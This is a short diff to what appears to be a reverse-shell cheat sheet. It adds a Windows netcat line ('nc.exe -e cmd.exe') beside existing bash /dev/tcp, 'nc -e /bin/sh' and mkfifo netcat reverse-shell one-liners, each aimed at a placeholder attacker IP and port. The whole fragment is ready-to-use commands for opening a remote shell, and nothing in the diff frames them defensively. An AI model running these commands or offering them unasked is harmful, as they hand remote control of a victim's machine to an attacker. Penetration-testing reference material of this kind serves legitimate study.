@@ -124,7 +124,9 @@ exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 ```bash
 # If nc e option available:
 nc -e /bin/sh <IP> <PORT> &
-# Else:
+nc.exe -e cmd.exe <IP> <PORT>
+
+# Else (Linux):
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
 ```
 
